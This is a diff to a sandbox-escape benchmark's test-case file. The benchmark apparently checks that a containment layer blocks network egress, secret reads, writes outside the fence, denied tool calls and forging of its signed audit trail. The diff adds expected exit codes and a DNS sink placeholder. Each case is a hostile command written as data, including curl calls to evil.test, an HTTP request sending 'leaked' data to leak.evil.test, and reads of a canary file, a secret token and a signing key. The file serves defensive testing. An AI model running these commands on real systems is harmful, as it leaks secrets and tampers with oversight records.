@@ -5,7 +5,11 @@
 # attack GOT WHAT IT WANTED (breach), non-zero means it was stopped. The two
 # controls flip that: they must exit 0 and be logged as allowed.
 #
-# Placeholders: @WORK@ (bench scratch dir), @BIN@ (dir with the MCP client), @KEY@ and @TRAIL@ (NockGuard signing key and signed trail, outside every grant).
+# blocked_exit = [..]    -> the exit codes that mean this attack was stopped (curl 35 = TLS handshake
+#                             refused, 22 = proxy 4xx, ...). Any other non-zero exit, such as a crashed
+#                             client's own 1, is a HARNESS-FAULT that fails the run, never a block.
+#
+# Placeholders: @WORK@ (bench scratch dir), @BIN@ (dir with the MCP client), @SINK@ (host UDP receiver on port 53; a datagram there is an escape), @KEY@ and @TRAIL@ (NockGuard signing key and signed trail, outside every grant).
 #
 # Proof fields name the signed row that must exist for the attempt:
 #   host = true            -> the attack runs on the host, outside the fence, directly
@@ -30,6 +34,7 @@ id = "egress-https-offlist"
 class = "off-allowlist-https"
 cmd = "curl -fsS -m 10 -o /dev/null https://evil.test/"
 expect = "blocked"
+blocked_exit = [35]
 evidence = "nocklock"
 event = "network_blocked"
 rule = "rule=disallowed_sni"
@@ -40,6 +45,7 @@ id = "egress-http-offlist"
 class = "off-allowlist-http"
 cmd = "curl -fsS -m 10 -o /dev/null http://evil.test/"
 expect = "blocked"
+blocked_exit = [22]
 evidence = "nocklock"
 event = "network_blocked"
 rule = "rule=disallowed_host"
@@ -59,6 +65,7 @@ except socket.timeout:
     data = b''
 sys.exit(0 if data[:1] in (b'\x15', b'\x16') else 1)"'''
 expect = "blocked"
+blocked_exit = [1]
 evidence = "nocklock"
 event = "network_blocked"
 rule = "rule=disallowed_sni"
@@ -69,6 +76,7 @@ id = "tcp-direct-public-ip"
 class = "raw-socket"
 cmd = '''python3 -c "import socket; socket.create_connection(('1.1.1.1', 443), 5)"'''
 expect = "blocked"
+blocked_exit = [1]
 floor = true
 evidence = "nocklock"
 event = "network_passed"
@@ -83,17 +91,14 @@ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.settimeout(3)
 q = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
 host, port = '@SINK@'.rsplit(':', 1)
-for dst in (('8.8.8.8', 53), (host, int(port))):
-    try:
-        s.sendto(q, dst)
-    except OSError:
-        continue
 try:
+    s.sendto(q, (host, int(port)))
     s.recvfrom(512)
 except OSError:
     sys.exit(1)
 sys.exit(0)"'''
 expect = "blocked"
+blocked_exit = [1]
 floor = true
 evidence = "nocklock"
 event = "network_passed"
@@ -109,6 +114,7 @@ s.send(b'GET /?d=leaked HTTP/1.0\r\nHost: leak.evil.test\r\n\r\n')
 s.settimeout(5)
 sys.exit(0 if s.recv(100).startswith(b'HTTP/1.1 200') else 1)"'''
 expect = "blocked"
+blocked_exit = [1]
 evidence = "nocklock"
 event = "network_blocked"
 rule = "rule=disallowed_host"
@@ -119,6 +125,7 @@ id = "secret-file-read"
 class = "secret-file-read"
 cmd = "cat @WORK@/outside/canary.txt"
 expect = "blocked"
+blocked_exit = [1]
 evidence = "nocklock"
 event = "file_blocked"
 rule = "reason=outside allowed directory"
@@ -129,6 +136,7 @@ id = "secret-env-read"
 class = "secret-env-read"
 cmd = 'test -n "$BENCH_SECRET_TOKEN"'
 expect = "blocked"
+blocked_exit = [1]
 evidence = "nocklock"
 event = "secret_blocked"
 rule = "BENCH_SECRET_TOKEN"
@@ -138,6 +146,7 @@ id = "write-outside-root"
 class = "write-outside-fence-root"
 cmd = "echo x > @WORK@/outside/planted.txt"
 expect = "blocked"
+blocked_exit = [2]
 absent = "@WORK@/outside/planted.txt"
 evidence = "nocklock"
 event = "file_blocked"
@@ -149,6 +158,7 @@ id = "mcp-tools-call-denied"
 class = "mcp-denied-tool"
 cmd = '''python3 @BIN@/mcp_client.py files_delete'''
 expect = "blocked"
+blocked_exit = [1]
 evidence = "nockguard"
 host = true
 tool = "files_delete"
@@ -160,6 +170,7 @@ id = "nockguard-key-read"
 class = "evidence-key-read"
 cmd = "cat @KEY@"
 expect = "blocked"
+blocked_exit = [1]
 evidence = "nocklock"
 event = "file_blocked"
 rule = "reason=outside allowed directory"
@@ -170,6 +181,7 @@ id = "nockguard-trail-append"
 class = "evidence-trail-write"
 cmd = "echo forged >> @TRAIL@"
 expect = "blocked"
+blocked_exit = [2]
 evidence = "nocklock"
 event = "file_blocked"
 rule = "reason=outside allowed directory"
